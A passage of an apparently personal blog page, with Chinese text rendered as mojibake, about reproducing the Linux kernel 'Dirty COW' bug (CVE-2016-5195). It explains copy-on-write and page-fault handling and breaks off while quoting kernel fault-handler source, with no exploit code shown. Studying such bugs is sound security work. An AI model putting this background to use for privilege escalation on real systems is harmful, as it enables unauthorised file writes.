<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="196082">
    
    <title>
        
            CVE-2016-5195å¤ç° |
        
        196082&#39;s blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    
        <link rel="shortcut icon" href="/images/rocket-lunch.svg">
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/fontawesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/regular.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/solid.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/brands.min.css">
    
    <script class="keep-theme-configurations">
    const KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"196082.github.io","root":"/","language":"zh-CN","path":"search.json"}
    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"196082's blog","author":196082,"avatar":"/images/ling.JPG","logo":"/images/ling.JPG","favicon":"/images/rocket-lunch.svg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-folder","tags":"/tags || fa-solid fa-tags"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":"è¯„è®ºé‚®ä»¶é€šçŸ¥çš„åŠŸèƒ½å·²å¼€å¯ï¼Œæ¬¢è¿å¤§å®¶ç•™è¨€è¯„è®ºï¼Œæœ‰é—®é¢˜æˆ‘ä¼šåŠæ—¶å›å¤çš„å“¦ï½","category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":false,"custom_badge":"æ…¢æ…¢å¥½èµ·æ¥"},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz","appkey":"C672AAYGXMkHxztf8ntdLShs","server_urls":null,"placeholder":"ğŸ˜œè‹¥æœ‰é—®é¢˜è¯·å„ä½å¤§å¸ˆå‚…ç•™è¨€è¯„è®ºï¼ˆç•™ä¸‹é‚®ç®±æœ‰é€šçŸ¥å“¦ï½ï¼‰"},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.2"}
    KEEP.language_ago = {"second":"%s ç§’å‰","minute":"%s åˆ†é’Ÿå‰","hour":"%s å°æ—¶å‰","day":"%s å¤©å‰","week":"%s å‘¨å‰","month":"%s ä¸ªæœˆå‰","year":"%s å¹´å‰"}
    KEEP.language_code_block = {"copy":"å¤åˆ¶ä»£ç ","copied":"å·²å¤åˆ¶","fold":"æŠ˜å ä»£ç å—","folded":"å·²æŠ˜å "}
    KEEP.language_copy_copyright = {"copy":"å¤åˆ¶ç‰ˆæƒä¿¡æ¯","copied":"å·²å¤åˆ¶","title":"åŸæ–‡æ ‡é¢˜","author":"åŸæ–‡ä½œè€…","link":"åŸæ–‡é“¾æ¥"}
  </script>
<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
</head>


<body>
<div class="progress-bar-container">
    

    
</div>



<main class="page-container border-box">
    <!-- home first screen  -->
    

    <!-- page content -->
    <div class="page-main-content border-box">
        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="border-box header-content">
        <div class="left flex-start border-box">
            
                <a class="logo-image border-box" href="/">
                    <img src="/images/ling.JPG">
                </a>
            
            <a class="site-name border-box" href="/">
               196082&#39;s blog
            </a>
        </div>

        <div class="right border-box">
            <div class="pc border-box">
                <ul class="menu-list border-box">
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-home"></i>
                                
                                é¦–é¡µ
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/archives">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-box-archive"></i>
                                
                                å½’æ¡£
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/categories">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-folder"></i>
                                
                                åˆ†ç±»
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/tags">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-tags"></i>
                                
                                æ ‡ç­¾
                                
                            </a>
                            
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="menu-text-color fas search fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile border-box flex-start">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list border-box">
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-home"></i>
                                </span>
                            
                            é¦–é¡µ
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-box-archive"></i>
                                </span>
                            
                            å½’æ¡£
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-folder"></i>
                                </span>
                            
                            åˆ†ç±»
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-tags"></i>
                                </span>
                            
                            æ ‡ç­¾
                        </a>
                        
                    </label>
                    
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle border-box">

            <div class="main-content border-box">
                

                    
<div class="fade-in-down-animation">
    <div class="post-page-container border-box">
        <div class="post-content-container border-box">
            

            <div class="post-content-bottom border-box">
                
                    <div class="post-title">
                        CVE-2016-5195å¤ç°
                    </div>
                

                
                    <div class="post-header border-box">
                        
                            <div class="avatar-box border-box">
                                <img src="/images/ling.JPG">
                            </div>
                        
                        <div class="info-box">
                            <div class="author border-box">
                                <span class="name">196082</span>
                                
                                    <span class="author-badge">æ…¢æ…¢å¥½èµ·æ¥</span>
                                
                            </div>
                            <div class="meta-info border-box">
                                

<div class="post-meta-info-container border-box post">
    <div class="post-meta-info border-box">
        

        
            <span class="meta-info-item post-create-date">
                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
                <span class="datetime">2023-08-08 10:46:43</span>
            </span>

            <span class="meta-info-item post-update-date">
                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
                <span class="datetime" data-updated="Wed Nov 29 2023 18:11:05 GMT+0800">2023-11-29 18:11:05</span>
            </span>
        

        
            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                <ul class="post-category-ul">
                    
                            <li class="category-item"><a href="/categories/Linux-Kernel/">Linux Kernel</a></li>
                        
                    
                            <li class="category-item">&nbsp;<i class="icon fas fa-angle-right"></i>&nbsp;<a href="/categories/Linux-Kernel/CVE%E5%A4%8D%E7%8E%B0/">CVEå¤ç°</a></li>
                        
                    
                </ul>
            </span>
        

        
            <span class="post-tag meta-info-item border-box">
                <ul class="post-tag-ul">
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/page-fault/">page fault</a></li>
                        
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/COW/">COW</a></li>
                        
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Race-condition/">Race condition</a></li>
                        
                    
                </ul>
            </span>
        

        
        
            <span class="meta-info-item post-wordcount">
                <i class="icon fas fa-file-word"></i>&nbsp;<span>7.6k å­—</span>
            </span>
        
        
            <span class="meta-info-item post-min2read">
                <i class="icon fas fa-clock"></i>&nbsp;<span>37 åˆ†é’Ÿ</span>
            </span>
        
        
            <span class="meta-info-item post-pv">
                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
            </span>
        
    </div>

    
</div>

                            </div>
                        </div>
                    </div>
                

                <div class="post-content keep-markdown-body ">
                    

                    
                         <h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>CVE-2016-5195å°±æ˜¯éå¸¸å‡ºåçš„<code>Dirty COW</code>ï¼Œä¿—ç§°<code>è„ç‰›æ¼æ´</code>ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡Linux Kernelä¸­çš„COW ( copy-on-write )æœºåˆ¶åˆ©ç”¨æ¡ä»¶ç«äº‰å®ç°è¶Šæƒå¯¹æ–‡ä»¶è¯»å†™ã€‚</p>
<p>æ­¤æ¼æ´è‡ªä»Linux Kernel 2.6.22ç‰ˆæœ¬å°±å­˜åœ¨ï¼Œç›´åˆ°2018å¹´Linux Kernel 4.8.3, 4.7.9, 4.4.26ç‰ˆæœ¬æ‰è¢«ä¿®å¤ã€‚å…¶å®è¿™ä¸€ä¸ªCVEåº”å½“æ˜¯ä¸€ä¸ªåˆå­¦è€…å¤ç°çš„ç¬¬ä¸€ä¸ªCVEçš„ï¼Œä½†æ˜¯å¯ç¬‘çš„æ˜¯æˆ‘æ˜¯çŸ¥é“ä»Šå¹´å››äº”æœˆä»½æ—¶é˜¿é‡Œå®ä¹ ç”ŸäºŒé¢çš„æ—¶å€™æ‰å¬è¯´è¿‡ï¼Œæ‰€ä»¥è¢«ç‹ ç‹ çš„åˆ·äº†ã€‚ç„¶è€Œä½œä¸ºä¸€æ¡æ‡’ç‹—æˆ‘ä¹Ÿæ˜¯ç¡¬æ‹–åˆ°ç°åœ¨æ‰è¿›è¡Œå¤ç°ï¼Œç„¶è€Œåœ¨ä¹‹å‰æˆ‘å°è¯•è¿‡å¤ç°ä¸€æ¬¡ä¸è¿‡å› ä¸ºç”µè„‘æ€§èƒ½è·‘ä¸å‡ºpocå°±æ”¾å¼ƒäº†ï¼Œå› ä¸ºæœ€è¿‘åˆè¦å¼€å§‹å„ç§é¢è¯•æ‰€ä»¥åˆè¦å¼€å§‹å­¦ä¹ å¾ˆå¤šä¸œè¥¿äº†ã€‚</p>
<h2 id="COWæœºåˆ¶"><a href="#COWæœºåˆ¶" class="headerlink" title="COWæœºåˆ¶"></a>COWæœºåˆ¶</h2><h3 id="basic-COW"><a href="#basic-COW" class="headerlink" title="basic COW"></a>basic COW</h3><p>COW å³ <code>copy on write</code>ï¼šç›®çš„æ˜¯ä¸ºäº†é™ä½ç³»ç»Ÿçš„å¼€é”€ï¼Œåœ¨ä¸€ä¸ªè¿›ç¨‹é€šè¿‡<code>fork()</code>åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹æ—¶ï¼Œå¹¶ä¸ä¼šç›´æ¥å°†çˆ¶è¿›ç¨‹çš„æ‰€æœ‰åœ°å€ç©ºé—´çš„æ‰€æœ‰å†…å®¹å¤åˆ¶å†åˆ†é…ç»™å­è¿›ç¨‹ã€‚è€Œå®é™…çš„æœºåˆ¶ä¸º<strong>çˆ¶è¿›ç¨‹ä¸å­è¿›ç¨‹å…±äº«æ‰€æœ‰çš„é¡µæ¡†ï¼Œè€Œä¸æ˜¯ç›´æ¥ç»™å­è¿›ç¨‹åˆ†é…æ–°çš„é¡µæ¡†ï¼Œåªæœ‰å½“å…¶ä¸­ä»»æ„ä¸€æ–¹å°è¯•å‘é¡µæ¡†å†™å…¥å†…å®¹æ—¶å†…æ ¸æ‰ä¼šä¸ºå…¶åˆ†é…é¡µæ¡†ï¼Œå¹¶å°†åŸæœ¬å†…æ¡†çš„å†…å®¹å¤åˆ¶è¿‡å»</strong>ã€‚</p>
<ol>
<li>åœ¨<code>fork()</code>ç³»ç»Ÿè°ƒç”¨åï¼Œçˆ¶å­è¿›ç¨‹ä¼šå…±äº«æ‰€æœ‰çš„é¡µæ¡†ï¼Œå†…æ ¸å°†æ‰€æœ‰çš„é¡µæ¡†å®šä¹‰ä¸º<code>read-only</code>ã€‚</li>
<li>ç”±äºæ‰€æœ‰é¡µæ¡†éƒ½æ˜¯åªè¯»çš„æƒé™ï¼Œå½“å…¶ä¸­ä»»æ„ä¸€æ–¹å°è¯•ä¿®æ”¹é¡µæ¡†æ—¶ä¾¿ä¼šè§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼Œæ­¤æ—¶å†…æ ¸ä¼šä¸ºå…¶åˆ†é…æ–°çš„é¡µæ¡†ã€‚</li>
</ol>
<p><img   src="/images/image-20230807101650345.png"  alt="image-20230807101650345"></p>
<p><img   src="/images/image-20230807101734100.png"  alt="image-20230807101734100"></p>
<p><img   src="/images/image-20230807101837765.png"  alt="image-20230807101837765"></p>
<p>ä»¥ä¸Šå°±æ˜¯å†™æ—¶å¤åˆ¶çš„åŸºæœ¬æµç¨‹ï¼Œå¤§å¤§çš„å‡å°‘äº†ç³»ç»Ÿçš„å¼€é”€ã€‚</p>
<h3 id="mmap-ä¸-COW"><a href="#mmap-ä¸-COW" class="headerlink" title="mmap ä¸ COW"></a>mmap ä¸ COW</h3><p>åœ¨ä¸Šæ–‡ä¸­æƒ³å¿…å„ä½éƒ½çœ‹åˆ°äº†ä¸€ä¸ªéå¸¸ç†Ÿæ‚‰çš„è¯<code>ç¼ºé¡µå¼‚å¸¸</code>ï¼Œå…¶å®åœ¨åŸå…ˆçš„æ–‡ç« ä¸­æˆ‘ä»¬å·²ç»é‡åˆ°è¿‡äº†ç¼ºé¡µå¼‚å¸¸ä¹Ÿæ˜¯å¸¸ç”¨çš„<code>userfaultfd</code>æœºåˆ¶ã€‚ç„¶è€Œå½“æ—¶æˆ‘ä»¬åˆ›å»ºçš„æ˜¯<code>PROT_READ|PROT_WRITE</code>ï¼Œå½“æˆ‘ä»¬æ˜ å°„ä¸€ä¸ªåªæœ‰è¯»æƒé™çš„æ–‡ä»¶ï¼Œè‹¥æ˜¯æˆ‘ä»¬æ­¤æ—¶å‘æ˜ å°„ä¸­å†™å…¥å†…å®¹æ—¶åŒæ ·ä¼šè§¦å‘å†™æ—¶å¤åˆ¶çš„æœºåˆ¶ï¼Œå°†æ–‡ä»¶å†…å®¹æ‹·è´åˆ°å†…å­˜ä¸­ï¼Œæ­¤æ—¶è¿›ç¨‹å¯¹è¿™å—åŒºåŸŸçš„è¯»å†™ä¾¿ä¸ä¼šå½±å“ç£ç›˜ä¸­çš„æ–‡ä»¶äº†ã€‚</p>
<h2 id="ç¼ºé¡µå¼‚å¸¸-write"><a href="#ç¼ºé¡µå¼‚å¸¸-write" class="headerlink" title="ç¼ºé¡µå¼‚å¸¸&amp;write"></a>ç¼ºé¡µå¼‚å¸¸&amp;write</h2><p>åœ¨ä»¥å‰å†™è¿‡çš„<code>userfaultfd</code>è¿™ä¸€åˆ©ç”¨æ–¹æ³•çš„æ—¶å€™å¹¶æ²¡æœ‰åˆ†æè¿‡ç¼ºé¡µå¼‚å¸¸çš„åŸç†æ›´åˆ«ææºç åˆ†æäº†ï¼Œæ‰€ä»¥è¿™æ¬¡æ­£å¥½å†™ä¸€ä¸‹ã€‚</p>
<p>åœ¨CPUä¸­ä½¿ç”¨MMUè¿›è¡Œè™šæ‹Ÿå†…å­˜å’Œç‰©ç†å†…å­˜ä¹‹é—´çš„æ˜ å°„ï¼Œç„¶è€Œåœ¨ç³»ç»Ÿä¸­å¹¶ä¸æ˜¯æ‰€æœ‰çš„è™šæ‹Ÿå†…å­˜é¡µé¢éƒ½æœ‰å¯¹åº”çš„ç‰©ç†å†…å­˜é¡µï¼Œå½“è½¯ä»¶è¯•å›¾è®¿é—®å·²ç»è¢«æ˜ å°„åœ¨è™šæ‹Ÿå†…å­˜ä¸­ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è¢«åŠ è½½åˆ°ç‰©ç†å†…å­˜ä¸­çš„ä¸€ä¸ªåˆ†é¡µæ—¶ï¼ŒMMUæ— æ³•å®Œæˆç”±è™šæ‹Ÿå†…å­˜åˆ°ç‰©ç†å†…å­˜ä¹‹é—´çš„è½¬åŒ–ï¼Œæ­¤æ—¶ä¾¿ä¼šäº§ç”Ÿ<strong>ç¼ºé¡µå¼‚å¸¸</strong>ã€‚</p>
<h3 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»"></a>åˆ†ç±»</h3><p>é‚£ä¹ˆè§¦å‘ç¼ºé¡µå¼‚å¸¸ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç§æƒ…å†µï¼š</p>
<ol>
<li>çº¿æ€§åœ°å€ä¸åœ¨è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­</li>
<li>çº¿æ€§åœ°å€åœ¨è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ï¼Œä½†æ˜¯æƒé™ä¸å¤Ÿ</li>
<li>çº¿æ€§åœ°å€åœ¨è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ï¼Œä½†æ˜¯æ²¡æœ‰ä¸ç‰©ç†åœ°å€ä¹‹é—´å»ºç«‹æ˜ å°„</li>
</ol>
<p>å…¶ç±»å‹ä¸»è¦åˆ†ä¸ºä»¥ä¸‹ä¸‰ç§ï¼š</p>
<ol>
<li><p>è½¯æ€§ç¼ºé¡µå¼‚å¸¸</p>
<p>è½¯æ€§ç¼ºé¡µå¼‚å¸¸æŒ‡çš„æ˜¯ç›¸å…³é¡µå·²ç»è¢«è½½å…¥åˆ°äº†å†…å­˜ä¸­ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰åœ¨MMUä¸­æ³¨å†Œï¼Œæ­¤æ—¶åªéœ€è¦å‘MMUæ³¨å†Œç›¸å…³çš„ç‰©ç†é¡µå³å¯ã€‚</p>
<p>ä¸»è¦å‡ºç°åœ¨ä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼š</p>
<ol>
<li>ä¸¤ä¸ªè¿›ç¨‹å…±äº«ç›¸åŒçš„ç‰©ç†é¡µæ¡†ï¼Œå†…æ ¸ä¸ºå…¶ä¸­ä¸€ä¸ªæ³¨å†Œäº†ç‰©ç†é¡µï¼Œä½†æ˜¯æ²¡æœ‰ä¸ºå¦å¤–ä¸€ä¸ªæ³¨å†Œ</li>
<li>è¯¥é¡µå·²ç»è¢«CPUçš„å·¥ä½œé›†ä¸­ç§»é™¤ï¼Œä½†æ˜¯å°šæœªäº¤æ¢åˆ°ç£ç›˜ä¸Šï¼Œè‹¥æ˜¯ç¨‹åºé‡æ–°ä½¿ç”¨è¯¥é¡µåˆ™å¦éœ€å‘MMUæ³¨å†Œ</li>
</ol>
</li>
<li><p>ç¡¬æ€§ç¼ºé¡µå¼‚å¸¸</p>
<p>ç¡¬æ€§ç¼ºé¡µå¼‚å¸¸åˆ™æ„å‘³ç€ä½¿ç”¨çš„é¡µå¹¶æ²¡æœ‰è¢«è½½å…¥åˆ°å†…å­˜ä¸­ï¼Œæ­¤æ—¶æ“ä½œç³»ç»Ÿåˆ™éœ€è¦è®²ä¸€ä¸ªåˆé€‚å¹¶ä¸”ç©ºé—²çš„ç‰©ç†é¡µè½½å…¥è¿›å†…å­˜ä¸­ï¼Œéšåå‘è¯¥é¡µä¸­å†™å…¥å†…å®¹ï¼Œå¹¶åœ¨MMUä¸­æ³¨å†Œã€‚ç¡¬æ€§ç¼ºé¡µå¼‚å¸¸çš„å¼€é”€æå¤§ï¼Œå› æ­¤éƒ¨åˆ†æ“ä½œç³»ç»Ÿä¹Ÿä¼šé‡‡å–å»¶è¿Ÿé¡µè½½å…¥çš„ç­–ç•¥â€”â€”åªæœ‰åˆ°ä¸‡ä¸å¾—å·²æ—¶æ‰ä¼šåˆ†é…æ–°çš„ç‰©ç†é¡µï¼Œè¿™ä¹Ÿæ˜¯ Linux å†…æ ¸çš„åšæ³•ã€‚è‹¥æ˜¯é¢‘ç¹åœ°å‘ç”Ÿç¡¬æ€§ç¼ºé¡µå¼‚å¸¸åˆ™ä¼šå¼•å‘ç³»ç»Ÿé¢ ç°¸ï¼Œå› èµ„æºè€—å°½è€Œæ— æ³•æ­£å¸¸å®Œæˆå·¥ä½œã€‚</p>
</li>
<li><p>æ— æ•ˆç¼ºé¡µå¼‚å¸¸</p>
<p>æ„å‘³ç€è¿›ç¨‹è®¿é—®äº†ä¸€ä¸ªæ— æ•ˆçš„å†…å­˜åœ°å€ï¼Œæ­¤æ—¶kernelä¼šå‘è¿›ç¨‹å‘é€<code>SIGSEGV</code>ä¿¡å·ã€‚</p>
</li>
</ol>
<h3 id="å¤„ç†ç¼ºé¡µå¼‚å¸¸"><a href="#å¤„ç†ç¼ºé¡µå¼‚å¸¸" class="headerlink" title="å¤„ç†ç¼ºé¡µå¼‚å¸¸"></a>å¤„ç†ç¼ºé¡µå¼‚å¸¸</h3><p>é’ˆå¯¹æ–‡æœ¬çš„ç¼ºé¡µå¼‚å¸¸å¤„ç†çš„æµç¨‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__do_page_fault() =&gt; __handle_mm_fault() =&gt; handle_pte_fault() =&gt; do_fault() =&gt; do_read_fault()/do_ww_fault()/do_shared_fault()</span><br></pre></td></tr></table></figure>

<p>ä»å¤´å¾€åçœ‹ï¼Œé¦–å…ˆçœ‹<code>__do_page_fault</code>å‡½æ•°ã€‚</p>
<h4 id="do-page-fault"><a href="#do-page-fault" class="headerlink" title="__do_page_fault"></a><strong>__do_page_fault</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> noinline <span class="keyword">void</span></span><br><span class="line">__do_page_fault(struct pt_regs *regs, <span class="keyword">unsigned</span> <span class="keyword">long</span> error_code,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> address)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span></span><br><span class="line">	<span class="keyword">int</span> fault, major = <span 